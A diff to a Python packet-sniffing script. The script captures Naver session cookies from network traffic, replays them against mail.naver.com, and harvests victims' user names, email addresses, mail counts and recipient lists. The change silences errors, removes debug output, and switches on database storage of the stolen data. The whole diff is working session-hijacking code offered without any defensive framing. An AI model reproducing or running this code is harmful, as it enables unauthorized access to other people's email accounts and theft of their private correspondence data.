@@ -15,29 +15,29 @@ def cookie_sniff(packet):
     global naver_reg
     global redundance_remove
     global i
-    #try:
-    if packet.haslayer("TCP"):
-        
-        try:
-            byte_pkt = packet.getlayer("TCP").payload.load.decode()
-        except:
-            return
-        if len(naver_reg.findall(byte_pkt)) != 0:
-            cookie_start_idx = byte_pkt.find("Cookie: ")
-            if cookie_start_idx != -1:
-                cookie_end_idx = byte_pkt.find("\x0d\x0a", cookie_start_idx)
-                cookie = byte_pkt[cookie_start_idx : cookie_end_idx]
-                if cookie not in redundance_remove:
-                    redundance_remove.append(cookie)
-                    #try:
-                    COOKIE_HASH_TABLE = cookie_parsing(cookie)
-                    mail_json_sniff(COOKIE_HASH_TABLE)
-                    #except:
-                    #    pass
-                else:
-                    return
-    #except:
-    #    pass
+    try:
+        if packet.haslayer("TCP"):
+            
+            try:
+                byte_pkt = packet.getlayer("TCP").payload.load.decode()
+            except:
+                return
+            if len(naver_reg.findall(byte_pkt)) != 0:
+                cookie_start_idx = byte_pkt.find("Cookie: ")
+                if cookie_start_idx != -1:
+                    cookie_end_idx = byte_pkt.find("\x0d\x0a", cookie_start_idx)
+                    cookie = byte_pkt[cookie_start_idx : cookie_end_idx]
+                    if cookie not in redundance_remove:
+                        redundance_remove.append(cookie)
+                        try:
+                            COOKIE_HASH_TABLE = cookie_parsing(cookie)
+                            mail_json_sniff(COOKIE_HASH_TABLE)
+                        except:
+                            pass
+                    else:
+                        return
+    except:
+        pass
 
 
 def cookie_parsing(cookie):
@@ -73,10 +73,6 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
     global time_duplicate
     global SIZE_LIST
 
-    #print(COOKIE_HASH_TABLE)
-
-    # sys.exit()
-    # print(cookie_header)
     requer = requests.get("http://mail.naver.com", cookies=COOKIE_HASH_TABLE)
 
     response = requer.content
@@ -89,7 +85,7 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
         return
 
     user_name = json_mail['env']['userName']
-    print(user_name)
+    
     try:
         time_duplicate[user_name]
     except:
@@ -97,7 +93,7 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
 
     if user_name not in SIZE_LIST:
         SIZE_LIST.append(user_name)
-        """
+        
         session = Session()
         session.add(MailSize(json_mail['env']['userName'],
                              json_mail['env']['mailAddress'],
@@ -106,7 +102,7 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
                              json_mail['list']['unreadCount'],
                              json_mail['list']['totalCount']))
         session.commit()
-        """
+        
         mail_data_list = json_mail['list']['mailData']
         for mail in mail_data_list:
 
@@ -116,14 +112,14 @@ def mail_json_sniff(COOKIE_HASH_TABLE):
             sent_time = datetime.datetime.fromtimestamp(mail['sentTime']) + datetime.timedelta(0, 0, 0, 0, 0, 16)
             if sent_time not in time_duplicate[user_name]:
                 time_duplicate[user_name].append(sent_time)
-                """
+                
                 session = Session()
                 session.add(MailList(json_mail['env']['userName'],
                                      json_mail['env']['mailAddress'],
                                      mail['toList'][0]['email'],
                                      mail['toList'][0]['name']))
                 session.commit()
-                """
+                
             else:
                 pass
 
